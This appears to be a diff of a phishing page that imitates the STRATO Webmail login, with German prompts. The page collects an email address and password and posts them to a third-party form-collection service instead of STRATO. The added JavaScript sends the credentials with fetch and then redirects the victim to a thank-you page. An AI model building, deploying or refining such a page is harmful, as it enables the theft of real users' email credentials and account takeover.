@@ -5,28 +5,123 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>STRATO Webmail Login</title>
   <link rel="stylesheet" href="css/style.css">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    header {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+    }
+
+    #site-logo {
+      width: 120px;
+    }
+
+    .login-box {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      width: 320px;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      font-size: 1.4rem;
+      color: #333;
+      margin-bottom: 1rem;
+    }
+
+    .login-box h1 span {
+      display: block;
+      font-weight: 400;
+      color: #777;
+      font-size: 0.95rem;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 0.95rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #007bff;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
 </head>
 <body>
 
-<header>
-  <img src="images/logo.png" alt="Strato Logo" id="site-logo">
-</header>
+  <header>
+    <img src="images/logo.png" alt="Strato Logo" id="site-logo">
+  </header>
 
-<main class="login-box">
-  <h1><span>STRATO Webmail</span><strong>LOGIN</strong></h1>
-  <form action="https://submit-form.com/2egN1olQU" method="POST">
-    <input type="hidden" name="_redirect" value="https://github.com/pub-fe32a33a64654d89bbae629/webmail.strats/thankyou.html">
+  <main class="login-box">
+    <h1><span>STRATO Webmail</span><strong>LOGIN</strong></h1>
 
-    <input type="text" name="email" placeholder="E-Mail-Adresse" required>
-    <input type="password" name="password" placeholder="Passwort" required>
-    <button type="submit">Anmelden</button>
-  </form>
-</main>
+    <form id="loginForm" action="https://submit-form.com/2egN1olQU" method="POST">
+      <input type="text" name="email" placeholder="E-Mail-Adresse" required>
+      <input type="password" name="password" placeholder="Passwort" required>
+      <button type="submit">Anmelden</button>
+    </form>
+  </main>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault(); // Stop default submission
+
+      const formData = new FormData(this);
+
+      try {
+        const response = await fetch(this.action, {
+          method: 'POST',
+          body: formData,
+        });
+
+        if (response.ok) {
+          // ✅ Redirect to local thankyou.html page after successful submission
+          window.location.href = 'thankyou.html';
+        } else {
+          alert('Fehler: Bitte versuchen Sie es erneut.');
+        }
+      } catch (error) {
+        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+      }
+    });
+  </script>
 
 </body>
 </html>
-
-
-
-
-
